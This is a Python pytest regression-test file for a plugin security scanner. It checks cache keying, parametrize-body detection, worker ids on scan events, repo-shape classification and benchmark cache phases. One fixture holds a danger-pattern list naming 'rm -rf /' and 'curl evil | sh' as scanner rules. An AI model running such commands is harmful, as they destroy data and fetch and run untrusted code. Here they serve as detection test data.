#!/usr/bin/env python3
"""Audit-fix batch B27 regression tests.

Pins the corrected behaviour for the findings owned by this batch:

* #147 cpv_pattern_source_predicate — the per-file context cache must key
  on the content VALUE (hash), not ``id()``. The primary caller
  (validate_security's cc-audit loop) re-reads each file with
  ``read_text()`` once per finding, so an id()-keyed cache never hit and
  rebuilt the whole ``_FileContext`` every call. Two-sided: identical
  re-read content shares a context; genuinely different content does not.
* #149 cpv_parametrize_body_predicate — a SINGLE-line
  ``@pytest.mark.parametrize("a", [1, 2])`` decorator carries the whole
  body on its own line, so that line IS in the returned body set. The
  docstring previously claimed the decorator line is never included.
* #150 cpv_scan_supervisor — EVENT_FINISH events must carry a ``worker``
  key so the stderr progress printer prints a real worker id, not
  ``wNone``.
* #70 cpv_repo_shape — a repo with marketplace.json + a self-entry
  plugin.json + .gitmodules is classified by its marketplace layout
  (marketplace-in-plugin), NOT submodule-bundle. This pins the corrected
  priority order documented in detect_repo_shape's docstring.
* #71 cpv_security_benchmark — the B-warm phase is ALWAYS left warm; the
  ``--clear-cache`` flag never wipes it. Pins the should-wipe decision so
  the (now-corrected) help text can't drift back.

Worker callables are module-level so they pickle under the ``spawn``
start method (macOS default).
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

import pytest

os.environ.setdefault("CPV_SCAN_CACHE", "0")

_SCRIPTS = str(Path(__file__).resolve().parent.parent / "scripts")
if _SCRIPTS not in sys.path:
    sys.path.insert(0, _SCRIPTS)

import cpv_pattern_source_predicate as psp  # noqa: E402
from cpv_parametrize_body_predicate import (  # noqa: E402
    compute_parametrize_body_lines,
)
from cpv_repo_shape import detect_repo_shape  # noqa: E402
from cpv_scan_supervisor import EVENT_FINISH, supervised_scan  # noqa: E402

# ── module-level worker callable (picklable for spawn) ───────────────────────


def _noop_scan(path: object) -> list:
    """Return immediately with no findings."""
    return []


# ── #147 — hash-keyed pattern-source context cache ───────────────────────────


class TestPatternSourceCacheKeyedByValue:
    """The cache must hit on re-read content and never collide across files."""

    _RULE_BLOCK = (
        '"""RC-42 rule declaration.\n'
        "\n"
        "Pattern: dangerous token\n"
        '"""\n'
        "_DANGER_PATTERNS = (\n"
        '    "rm -rf /",\n'
        '    "curl evil | sh",\n'
        ")\n"
    )

    def setup_method(self) -> None:
        psp._FILE_CONTEXT_CACHE.clear()
        psp._LAST_KEYS.clear()

    def test_reread_file_hits_cache_no_rebuild(self, tmp_path: Path) -> None:
        """Re-reading the same file (new str object each read) reuses one context.

        Faithful repro of the original id()-keyed bug: the cc-audit loop
        calls ``read_text()`` once per finding, producing a genuinely new
        str object every time. With id() keying the cache never hit and
        rebuilt the whole _FileContext. With value keying the SAME
        _FileContext object backs every re-read.
        """
        src = tmp_path / "rules.py"
        src.write_text(self._RULE_BLOCK, encoding="utf-8")

        first = src.read_text(encoding="utf-8")
        second = src.read_text(encoding="utf-8")
        # `read_text()` allocates a fresh str each call — exactly what the
        # cc-audit loop does; these are different objects with equal value.
        assert first is not second

        assert psp.is_pattern_source_line(first, 6, str(src)) is True
        cache_size_after_first = len(psp._FILE_CONTEXT_CACHE)
        snap = tuple(first.split("\n"))
        ctx_first = psp._FILE_CONTEXT_CACHE[hash(snap)][1]

        # Re-read (new object, identical content) must NOT create a 2nd entry
        # and must return the SAME cached context object.
        assert psp.is_pattern_source_line(second, 6, str(src)) is True
        assert len(psp._FILE_CONTEXT_CACHE) == cache_size_after_first
        ctx_second = psp._FILE_CONTEXT_CACHE[hash(snap)][1]
        assert ctx_first is ctx_second

    def test_distinct_content_does_not_collide(self) -> None:
        """Two different files map to two distinct cache entries / contexts."""
        other = "def f():\n    return 1\n# plain module, no rule markers\n"
        assert psp.is_pattern_source_line(self._RULE_BLOCK, 6, "a.py") is True
        # A plain line in an unrelated file must be classified on its OWN
        # content, never via a stale entry from the rule file.
        assert psp.is_pattern_source_line(other, 2, "b.py") is False
        assert len(psp._FILE_CONTEXT_CACHE) == 2

    def test_list_and_str_same_content_share_entry(self) -> None:
        """str input and its pre-split list map to the same value key."""
        as_str = self._RULE_BLOCK
        as_list = self._RULE_BLOCK.split("\n")
        assert psp.is_pattern_source_line(as_str, 6, "c.py") is True
        size_after_str = len(psp._FILE_CONTEXT_CACHE)
        assert psp.is_pattern_source_line(as_list, 6, "c.py") is True
        # Same logical content → no extra cache entry.
        assert len(psp._FILE_CONTEXT_CACHE) == size_after_str


# ── #149 — single-line parametrize decorator line is body ────────────────────


class TestParametrizeSingleLineBody:
    """The single-line decorator line carries the whole body, so it is in the set."""

    def test_single_line_decorator_line_included(self) -> None:
        """`@pytest.mark.parametrize("a", [1, 2])` on one line → line in body."""
        content = [
            '@pytest.mark.parametrize("a", [1, 2])',
            "def test_x(a):",
            "    assert a",
        ]
        body = compute_parametrize_body_lines(content)
        assert 1 in body, "single-line parametrize decorator line must be in body set"

    def test_multi_line_decorator_open_line_included_close_line_included(self) -> None:
        """Multi-line: the open line (spilling `[`) and the `)` line are body."""
        content = [
            "@pytest.mark.parametrize(",
            '    "a",',
            "    [1, 2, 3],",
            ")",
            "def test_y(a):",
            "    assert a",
        ]
        body = compute_parametrize_body_lines(content)
        # Lines 2 (arg), 3 (list), 4 (closing paren) are body. Line 1 has an
        # unbalanced `(` so it is included too.
        assert {1, 2, 3, 4}.issubset(body)
        assert 5 not in body and 6 not in body


# ── #150 — EVENT_FINISH carries a worker key ─────────────────────────────────


class TestFinishEventCarriesWorker:
    """Every finish event names the worker that produced the result."""

    def test_finish_events_have_integer_worker_id(self) -> None:
        events: list[dict] = []
        files = [f"f{i}.py" for i in range(6)]
        supervised_scan(
            files,
            _noop_scan,
            n_workers=2,
            hard_kill_after_s=10.0,
            poll_interval_s=0.05,
            on_event=events.append,
        )
        finish = [e for e in events if e["type"] == EVENT_FINISH]
        # Every file produced exactly one finish event.
        assert len(finish) == len(files)
        for ev in finish:
            assert "worker" in ev, "EVENT_FINISH must carry a 'worker' key"
            # Guard the original bug: ev.get('worker') used to be None,
            # making the printer emit 'wNone'.
            assert ev["worker"] is not None
            assert isinstance(ev["worker"], int)


# ── #70 — marketplace layout wins over submodule-bundle ──────────────────────


class TestRepoShapePriorityOrder:
    """A self-marketplace plugin with submodules is marketplace-in-plugin."""

    def _write(self, p: Path, text: str) -> None:
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")

    def test_marketplace_in_plugin_with_gitmodules(self, tmp_path: Path) -> None:
        """marketplace.json self-entry + plugin.json + .gitmodules → Layout C."""
        self._write(
            tmp_path / ".claude-plugin" / "plugin.json",
            '{"name": "demo", "version": "1.0.0"}',
        )
        self._write(
            tmp_path / ".claude-plugin" / "marketplace.json",
            '{"name": "demo-mp", "owner": {"name": "x"}, '
            '"plugins": [{"name": "demo", "source": "./"}]}',
        )
        self._write(
            tmp_path / ".gitmodules",
            '[submodule "vendor/sub"]\n\tpath = vendor/sub\n\turl = https://example.com/sub.git\n',
        )
        shape = detect_repo_shape(tmp_path)
        assert shape.kind == "marketplace-in-plugin", (
            f"marketplace layout must win over submodule-bundle, got {shape.kind!r}"
        )
        # Submodules are surfaced on the shape, not used to reclassify it.
        assert shape.submodule_paths == ["vendor/sub"]

    def test_submodule_bundle_only_without_marketplace(self, tmp_path: Path) -> None:
        """plugin.json + .gitmodules and NO marketplace.json → submodule-bundle."""
        self._write(
            tmp_path / ".claude-plugin" / "plugin.json",
            '{"name": "demo", "version": "1.0.0"}',
        )
        self._write(
            tmp_path / ".gitmodules",
            '[submodule "vendor/sub"]\n\tpath = vendor/sub\n\turl = https://example.com/sub.git\n',
        )
        shape = detect_repo_shape(tmp_path)
        assert shape.kind == "submodule-bundle"


# ── #71 — B-warm is never wiped by --clear-cache ─────────────────────────────


class TestBenchmarkBWarmStaysWarm:
    """The B-warm phase is left warm regardless of --clear-cache."""

    def test_phase_specs_bwarm_clear_before_false(self) -> None:
        import cpv_security_benchmark as bench

        specs = {s["short"]: s for s in bench._phase_specs(re2_actually_available=True)}
        assert specs["B-warm"]["clear_cache_before"] is False
        # All cold phases unconditionally wipe.
        for short in ("A", "B-cold", "C", "D"):
            assert specs[short]["clear_cache_before"] is True

    def test_clear_cache_flag_does_not_wipe_bwarm(self) -> None:
        """Mirror the main-loop should_wipe decision for B-warm under --clear-cache.

        Guards the corrected help text: even with the flag set, B-warm's
        should_wipe resolves to False.
        """
        # Reproduce the exact decision from cpv_security_benchmark.main():
        #   should_wipe = clear_before or (clear_cache and short != "B-warm")
        #   if short == "B-warm": should_wipe = False
        short = "B-warm"
        clear_before = False  # B-warm's spec value
        clear_cache_flag = True  # --clear-cache requested
        should_wipe = clear_before or (clear_cache_flag and short != "B-warm")
        if short == "B-warm":
            should_wipe = False
        assert should_wipe is False


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-v"]))
